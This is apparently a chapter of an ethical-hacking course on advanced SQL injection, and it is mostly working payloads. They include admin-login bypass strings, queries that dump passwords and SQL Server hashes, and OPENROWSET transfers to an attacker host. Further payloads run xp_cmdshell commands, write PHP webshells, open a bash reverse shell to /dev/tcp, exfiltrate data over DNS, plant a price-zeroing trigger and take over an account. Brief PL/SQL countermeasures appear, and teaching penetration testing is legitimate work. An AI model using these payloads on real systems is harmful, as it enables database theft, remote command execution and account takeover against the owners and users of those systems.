# 05 — SQL Injection Methodology: Advanced SQL Injection

The attacker doesn't stop at exfiltrating application data. Using a compromised application, the attacker escalates to
compromise the underlying **operating system** and the **network** — using the target as a staging post for further
attacks, extracting OS details and stored credentials, executing arbitrary commands, accessing the file system, and
even planting Trojans or keyloggers.

## Database, Table, and Column Enumeration

Attackers use various SQL queries to enumerate database names, table names, and columns. This information can then be
used to obtain sensitive data, perform admin-level operations, and even read arbitrary files off the DBMS host.

### Identify User-Level Privilege

Several SQL built-in scalar functions work across most implementations:

```sql
user  or  current_user, session_user, system_user

' and 1 in (select user ) --
'; if user ='dbo' waitfor delay '0:0:5 '--
' union select if( user() like 'root@%', benchmark(50000,sha1('test')), 'false' );
```

### DB Administrator Accounts

Default administrator account names to look for: `sa`, `system`, `sys`, `dba`, `admin`, `root`, and others.
`dbo` is a special user with implied permissions to perform **all** activities on the database — any object created
by any member of the `sysadmin` fixed server role automatically belongs to `dbo`.

### Discover DB Structure

```sql
-- Determine table and column names
' group by columnnames having 1=1 --

-- Discover column data types
' union select sum(columnname) from tablename --

-- Enumerate user-defined tables
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
```

### Column Enumeration Per DBMS

| DBMS | Query |
|---|---|
| **MSSQL** | `SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')` or `sp_columns tablename` |
| **MySQL** | `show columns from tablename` |
| **Oracle** | `SELECT * FROM all_tab_columns WHERE table_name='tablename'` |
| **DB2** | `SELECT * FROM syscat.columns WHERE tabname= 'tablename'` |
| **PostgreSQL** | `SELECT attnum,attname from pg_class, pg_attribute WHERE relname= 'tablename' AND pg_class.oid=attrelid AND attnum > 0` |

### Table 15.3 — Database Objects for Enumeration Per DBMS

| Oracle | MS Access | MySQL | MSSQL Server |
|---|---|---|---|
| `SYS.USER_OBJECTS` | `MSysAccessObjects` | `mysql.user` | `sys.objects` |
| `SYS.USER_TABLES` | `MSysACEs` | `mysql.db` | `sys.columns` |
| `SYS.USER_VIEWS` | `MSysObjects` | `mysql.tables_priv` | `sys.types` |
| `SYS.ALL_TABLES` | `MSysQueries` | | `sys.databases` |
| `SYS.USER_TAB_COLUMNS` | `MSysRelationships` | | |

## Advanced Enumeration

Used for system- and network-level information gathering; different database objects are used depending on target.

**Tables and columns enumeration in one query (MSSQL):**

```sql
' union select 0, sys.objects.name + ': ' + sys.columns.name + ': ' + sys.types.name, 1, 1, '1', 1, 1, 1, 1, 1
from sys.objects, sys.columns, sys.types
where sys.objects.xtype = 'U' AND sys.objects.id = sys.columns.id AND sys.columns.xtype = sys.types.xtype --
```

**Database enumeration:**

```sql
-- Different databases in the server
' and 1 in (select min(name) from master.dbo.sys.databases where name >'.') --

-- File location of databases
' and 1 in (select min(filename) from master.dbo.sys.databases where filename >'.') --
```

**Password grabbing (build a colon-delimited login:password string into a temp variable, exfiltrate via error/blind):**

```sql
begin declare @var varchar(8000) set @var=':' select @var=@var+' '+login+'/'+password+' ' from users where login>@var
select @var as var into temp end;--
' and 1 in (select var from temp) --
'; drop table temp --
```

## Features of Different DBMS

Once the attacker (or the tester) identifies the DBMS, they scope the attack to that database's specific syntax:

| Feature | MySQL | MSSQL | MS Access | Oracle | DB2 | PostgreSQL |
|---|---|---|---|---|---|---|
| String Concatenation | `concat(,)`, `concat_ws(delim,)` | `+` | `&` | `\|\|` | `concat` / `+` / `\|\|` (all three) | `\|\|` |
| Comments | `--`, `/* */`, `#` | `--`, `/* */` | *No* | `--`, `/* */` | `--` | `--`, `/* */` |
| Request Union | `union` | `union` and `;` | `union` | `union` | `union` | `union` and `;` |
| Sub-requests | Yes | Yes | *No* | Yes | Yes | Yes |
| Stored Procedures | Yes | Yes | Yes | Yes | Yes | Yes |
| Info-schema/analog available | Yes | Yes | Yes | Yes | Yes | Yes |

**Per-DBMS `UNION`/sub-request examples:**

```sql
-- MySQL
SELECT * from table where id = 1 union select 1,2,3

-- PostgreSQL (stacked query)
SELECT * from table where id = 1; select 1,2,3

-- Oracle
SELECT * from table where id = 1 union select null,null,null from sys.dual
```

## Creating Database Accounts (Privilege Escalation)

| DBMS | Commands |
|---|---|
| **Microsoft SQL Server** | `exec sp_addlogin 'victor', 'Pass123'`<br>`exec sp_addsrvrolemember 'victor', 'sysadmin'` |
| **Oracle** | `CREATE USER victor IDENTIFIED BY Pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users;`<br>`GRANT CONNECT TO victor;`<br>`GRANT RESOURCE TO victor;` |
| **MS Access** | `CREATE USER victor IDENTIFIED BY 'Pass123'` |
| **MySQL** | `INSERT INTO mysql.user (user, host, password) VALUES ('victor', 'localhost', PASSWORD('Pass123'))` |

## Password Grabbing

One of the most serious consequences of SQLi — attackers grab credentials straight from user-defined tables, then
change, destroy, or steal them; sometimes escalating all the way to admin using the stolen credentials.

```sql
begin declare @var varchar(8000)
set @var=':' select @var=@var+' '+login+'/'+password+' ' from users where login>@var
select @var as var into temp end; --
' and 1 in (select var from temp) --
'; drop table temp --
```

## Grabbing SQL Server Hashes

Some databases store user IDs/passwords as hash values in a `syslogins` table. An attacker extracts these, hex-encodes
them via a T-SQL loop, then cycles through all the passwords.

```sql
-- Extract the raw hashes
SELECT password FROM sys.syslogins

-- Hex-encode each hash
begin @charvalue='0x', @i=1, @length=datalength(@binvalue),
@hexstring = '0123456789ABCDEF'
while (@i<=@length) BEGIN
  declare @tempint int, @firstint int, @secondint int
  select @tempint=CONVERT(int,SUBSTRING(@binvalue,@i,1))
  select @firstint=FLOOR(@tempint/16)
  select @secondint=@tempint - (@firstint*16)
  select @charvalue=@charvalue + SUBSTRING(@hexstring,@firstint+1,1) + SUBSTRING(@hexstring,@secondint+1,1)
  select @i=@i+1
END;
-- Cycle through all the passwords
```

**Example 2 — display hashes via an error message (convert → hex → concatenate):**

```sql
SELECT name, password FROM sys.syslogins
```

The `password` field normally requires `dba` access; with lower privileges you can still recover usernames and brute
force the password. SQL Server hash sample format:

```
0x010034767D5C0CFA5FDCA28C4A56085E65E882E71CB0ED2503412FD54D6119FFF04129A1D72E7C3194F7284A7F3A
```

**Extracting hashes through error messages when the message would otherwise truncate a long string** — pull it out in
chunks:

```sql
' and 1 in (select x from temp) --
' and 1 in (select substring(x, 256, 256) from temp) --
' and 1 in (select substring(x, 512, 256) from temp) --
' drop table temp --
```

## Transfer Database to Attacker's Machine

An SQL Server can be linked to the attacker's own database via `OPENROWSET`. The database structure is replicated,
then data is transferred over a remote connection.

```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
   'select * from mydatabase..hacked_sysdatabases')
select * from sys.sysdatabases --

'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
   'select * from mydatabase..hacked_sysobjects')
select * from sys.sysobjects --

'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
   'select * from mydatabase..hacked_syscolumns')
select * from sys.syscolumns --

-- ...then repeat for any arbitrary table
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=myIP,80;',
   'select * from mydatabase..table1')
select * from database..table1 --
```

## Interacting with the Operating System

Two ways to interact with the OS via SQLi:
1. **Reading/writing system files** from disk.
2. **Direct command execution** via a remote shell (can abuse a Windows access token to escalate privilege).

### MSSQL — via `xp_cmdshell`

Even without a direct output channel, you can capture command output by writing it to a file, bulk-loading that file
into a temp table, then reading the table back through a blind/error channel:

```sql
'; exec master..xp_cmdshell 'ipconfig > test.txt' --
'; CREATE TABLE tmp (txt varchar(8000)); BULK INSERT tmp FROM 'test.txt' --
'; begin declare @data varchar(8000); set @data='| '; select @data=@data+txt+'|' from tmp where txt<@data; select @data as x into temp end --
' and 1 in (select substring(x,1,256) from temp) --
'; declare @var sysname; set @var = 'del test.txt'; EXEC master..xp_cmdshell @var; drop table temp; drop table tmp --
```

### MySQL — via User-Defined Functions (UDF)

```sql
CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll';
CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgj.dll';
```

> Both methods are restricted by the database's own running privileges/permissions.

## Interacting with the File System (MySQL)

### `LOAD_FILE()` — read an arbitrary file

```sql
NULL UNION ALL SELECT LOAD_FILE('/etc/passwd')/*
```

If successful, this displays the contents of `/etc/passwd` directly.

### `INTO OUTFILE()` — write a webshell

```sql
NULL UNION ALL SELECT NULL,NULL,NULL,NULL,'<?php system($_GET["command"]); ?>' INTO OUTFILE '/var/www/certifiedhacker.com/shell.php'/*
```

If successful, the attacker now has a webshell and can run arbitrary system commands:

```
http://www.certifiedhacker.com/shell.php?command=wget
```

## Network Reconnaissance Using SQL Injection

```sql
-- Retrieve server name/configuration
' and 1 in (select @@servername) --
' and 1 in (select srvname from sys.sysservers) --
```

Via `xp_cmdshell`: `ipconfig/all`, `tracert myIP`, `arp -a`, `nbtstat -c`, `netstat -ano`, `route print`.

**Reverse DNS / Reverse Pings / `OPENROWSET`:**

```sql
'; exec master..xp_cmdshell 'nslookup a.com MyIP' --
'; exec master..xp_cmdshell 'ping 10.0.0.75' --
'; select * from OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;Address=10.0.0.75,80;','select * from table')
```

**Full network-recon query chain** (combine multiple recon commands into one file, then exfiltrate via the same
read-back pattern used above):

```sql
'; declare @var varchar(256); set @var = ' del test.txt && arp -a >> test.txt && ipconfig /all >> test.txt &&
   nbtstat -c >> test.txt && netstat -ano >> test.txt && route print >> test.txt &&
   tracert -w 10 -h 10 google.com >> test.txt'; EXEC master..xp_cmdshell @var --
'; CREATE TABLE tmp (txt varchar(8000)); BULK INSERT tmp FROM 'test.txt' --
'; begin declare @data varchar(8000); set @data=': '; select @data=@data+txt+'|' from tmp where txt<@data; select @data as x into temp end --
' and 1 in (select substring(x,1,255) from temp) --
'; declare @var sysname; set @var = 'del test.txt'; EXEC master..xp_cmdshell @var; drop table temp; drop table tmp --
```

> **Note:** Microsoft disables `xp_cmdshell` by default. To re-enable it (requires `sysadmin`):
> ```sql
> EXEC sp_configure 'xp_cmdshell', 1
> GO
> RECONFIGURE
> GO
> ```

## Finding and Bypassing the Admin Panel of a Website

Attackers use Google dorks to find admin login pages, then attempt SQLi against them.

**Google dorks:**

```
inurl:"adminlogin.aspx"    inurl:"admin/index.php"    inurl:"administrator.php"   inurl:"administrator.asp"
inurl:"/admin/"            inurl:"login.asp"          inurl:"/admin/login.php"    inurl:"login.aspx"
inurl:"login.php"          inurl:"admin/index.html"   inurl:"adminlogin.php"
```

**Resulting candidate URLs:**

```
http://www.certifiedhacker.com/admin.php
http://www.certifiedhacker.com/admin/
http://www.certifiedhacker.com/admin.html
http://www.certifiedhacker.com:2082/
```

**Full admin-bypass payload list** (see also
[`cheatsheets/payloads-cheatsheet.md`](cheatsheets/payloads-cheatsheet.md)):

```
' or 1=1 --      1'or'1'='1      admin'--        " or 0=0 --      or 0=0 --
' or 0=0 #       " or 0=0 #      or 0=0 #         ' or 'x'='x      " or "x"="x
') or ('x'='x    ' or 1=1--      " or 1=1--       or 1=1--
```

After bypassing admin auth, the attacker gets full admin panel access and can install a backdoor for further attacks.

## PL/SQL Exploitation

PL/SQL (like stored procedures) is just as vulnerable when it integrates user input into dynamic queries at runtime.

**Example vulnerable procedure (Oracle):** table `User_Details(UserName VARCHAR2, Password VARCHAR2)`

```sql
CREATE OR REPLACE PROCEDURE Validate_UserPassword(N_UserName IN VARCHAR2, N_Password IN VARCHAR2) AS
CUR SYS_REFCURSOR;
FLAG NUMBER;
BEGIN
  OPEN CUR FOR 'SELECT 1 FROM User_Details WHERE UserName = ''' || N_UserName || '''' || ' AND Password = ''' || N_Password || '''';
  FETCH CUR INTO FLAG;
  IF CUR%NOTFOUND THEN
    RAISE_APPLICATION_ERROR(-20343, 'Password Incorrect');
  END IF;
  CLOSE CUR;
END;
```

Normal call: `EXEC Validate_UserPassword('Bob', '@Bob123');`

**1) Exploiting Quotes:**

```sql
EXEC Validate_UserPassword ('Bob', 'x'' OR ''1''=''1');
-- Resultant: SELECT 1 FROM User_Details WHERE UserName = 'Bob' AND Password = 'x' OR '1'='1';
```

**2) Exploitation by Truncation** (comment out the password check entirely):

```sql
EXEC Validate_UserPassword ('Bob''--', '');
-- Resultant: SELECT 1 FROM User_Details WHERE UserName = 'Bob'-- AND Password='';
```

> The same two techniques apply to any insecure dynamic-SQL code in PHP, .NET, etc. — not just PL/SQL.

**PL/SQL countermeasures:**
- Minimize user input passed to dynamic SQL
- Validate/sanitize input before use
- Use Oracle's `DBMS_ASSERT` package
- Use bind parameters in dynamic SQL
- Avoid single quotes; use secure string parameters with double quotes
- Apply least-privilege to the DB account executing the PL/SQL
- Regularly review/test PL/SQL code for SQLi
- Customize error handling to avoid leaking DB metadata

## Creating Server Backdoors Using SQL Injection

### Getting an OS Shell

**Using `OUTFILE` (write a webshell):**

```sql
SELECT '<?php exec($_GET[''cmd'']); ?>' FROM usertable INTO dumpfile '/var/www/html/shell.php'
```

**Finding directory structure first** (to know where to place the shell):

```sql
SELECT @@datadir;
```

**Using built-in DBMS functions (MSSQL `xp_cmdshell`) — spawn an interactive reverse shell:**

```sql
EXEC xp_cmdshell 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'
```

### Creating a Database Backdoor (via Triggers)

A trigger is a stored procedure automatically invoked on a specific DB event. Example — an online shop stores items in
an `ITEMS` table; an attacker injects a trigger that resets the price to `0` on every insert/update:

```sql
CREATE OR REPLACE TRIGGER SET_PRICE
AFTER INSERT OR UPDATE ON ITEMS
FOR EACH ROW
BEGIN
  UPDATE ITEMS SET Price = 0;
END;
```

Now every purchase is effectively free until the trigger is found and removed.

## HTTP Header-Based SQL Injection

Attackers can inject SQL through HTTP headers themselves when the app fails to sanitize them.

**Common Request Header fields:**
```
GET / HTTP/1.1
Connection: "Connection"
Keep-Alive: "Timeout"
Accept:*/*
Host: Host":" host [ ":" port ]
Accept-Language: language [q=qvalue]
Accept-Encoding: "encoding types"
User-Agent: "<product><product-version> <comment>"
Cookie: name=value
```

Cookies are often the very first HTTP variable attackers test, since they're commonly stored server-side for session
tracking.

### X-Forwarded-For

Identifies the client IP behind a proxy — frequently trusted and stored without sanitization.

**Vulnerable PHP:**

```php
$req = mysql_query("SELECT username,pwd FROM admin_table WHERE username='".sanitize($_POST['user'])."'
    AND pwd='".md5($_POST['password'])."' AND ipadrr='".ip_address()."'");

function sanitize($params){
    if (is_numeric($params)) { return $params; }
    else { return mysql_real_escape_string($params); }
}

function ip_address() {
    if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip_addr = $_SERVER['HTTP_X_FORWARDED_FOR']; }
    else { $ip_addr = $_SERVER["REMOTE_ADDR"]; }
    if(preg_match("#^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}#",$ip_addr)) { return $ip_addr; }
    else { return $_SERVER["REMOTE_ADDR"]; }
}
```

Username and password are sanitized — but the IP taken from `X-Forwarded-For` isn't safely handled despite the regex
check, and remains injectable:

```
GET /index.php HTTP/1.1
Host: [host]
X_FORWARDED_FOR: 10.10.10.11' or 1=1#
```

### User-Agent

```
GET /index.php HTTP/1.1
Host: [host]
User-Agent: aaa' or 1/*
```

### Referer

```
GET /index.php HTTP/1.1
Host: [host]
User-Agent: aaa' or 1/*
Referer: http://www.hackerswebsite.com
```

## DNS Exfiltration Using SQL Injection

Extracts data (e.g. password hashes) via DNS requests — a technique that survives firewalls which block direct
database→Internet traffic but still allow DNS to pass through an internal resolver, since those requests appear to
originate from the server itself.

```sql
do_dns_lookup((select top 1 password from users) + '.certifiedhacker.com');
```

The attacker performs a DNS lookup for a fabricated hostname combining the exfiltrated value with their own domain,
then sniffs traffic at their own nameserver:

```
appserver.example.com.5678 > ns.certifiedhacker.com.53 A? 0x4a6f686e.certifiedhacker.com
```

`0x4a6f686e` here is the extracted password hash, embedded directly as a DNS subdomain label.

**MS SQL Server DNS exfiltration (forces a UNC/SMB lookup that resolves via DNS):**

```sql
DECLARE @hostname varchar(1024);
SELECT @hostname=(SELECT HOST_NAME())+'.appserver.example.com;
EXEC('master.dbo.xp_dirtree "\\'+@hostname+'\c$"');
```

## MongoDB / NoSQL Injection

MongoDB (a NoSQL database) is vulnerable to NoSQL injection when application authentication code fails to sanitize
input — leading to auth bypass, data exfiltration, or modification. Affects PHP, JS, Python, and Java apps that use
MongoDB operators like `$eq`, `$ne`, `$gt`, `$gte`, and `[$regex]`.

**Vulnerable PHP auth code:**

```php
$user_name = $_POST['username'];
$pwd = $_POST['password'];
$new_conn = new MongoDB\Client('mongodb://localhost:27017');
if($new_conn) {
    $mydb = $new_conn->mytest;
    $users = $mydb->users;
    $myquery = array("user" => $user_name, "password" => $pwd);
    $myreq = $users->findOne($myquery);
}
```

**NoSQLi payload to log in as admin without knowing the password:**

```
User_name[$eq]=admin&pwd[$ne]=admin
```

### JavaScript Injection via `$where`

```php
$myquery = array('$where' => 'this.username === \''.$username.'\'');
```

**Dump every user** by injecting an always-true JS expression:

```
'; return '' == '
```

**Trigger a Denial-of-Service** by injecting an infinite loop instead:

```javascript
while(true) { }
```

## Bypassing WAF Using JSON-Based SQL Injection

WAFs commonly detect special characters like `=`, `<`, `>`. Attackers instead smuggle payloads using **JSON
operators**, which many WAFs don't inspect the same way:

```
'or  '{"key": "value"}' ? "key"
```

**Example JSON payload:**

```json
{"user": "<username>' --","pass": "irrelevant"}
```

Server builds and executes:

```sql
SELECT * FROM users WHERE username = '<username>' --' AND password = 'irrelevant';
```

The `--` comment truncates the password check, bypassing login with any existing username.

## Perform SQL Injection to Insert a New User and Update a Password

### Inserting a New User

If the attacker knows the `Users` table structure and has `INSERT` rights (directly or via a vulnerable query):

```sql
-- Original
SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com'

-- Injected
SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com'; INSERT INTO Users (Email_ID, User_Name, Password)
VALUES ('Clark@mymail.com','Clark','MyPassword');--';
```

> Only works if the target table permits `INSERT` in this context, and has no blocking foreign-key dependencies.

### Updating a Password (Account-Takeover Chain via "Forgot Password" Abuse)

Overwrite the victim's stored email address so the "forgot password" reset flow goes to the attacker's own inbox:

```sql
-- Original
SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com'

-- Injected
SELECT * FROM Users WHERE Email_ID = 'Alice@xyz.com';
UPDATE Users SET Email_ID = 'Clark@mymail.com' WHERE Email_ID='Alice@xyz.com';
```

The attacker now opens the login page, clicks **"Forgot Password?"**, and the reset email goes straight to their own
inbox. They reset Alice's password, log in as Alice, and act on her behalf — a complete account-takeover chain
built entirely on SQLi.

---

**Previous:** [04 — Methodology: Launching SQL Injection Attacks](04-methodology-launching-attacks.md) · **Next:** [06 — SQL Injection Tools & AI-Assisted Testing](06-sql-injection-tools-and-ai.md)
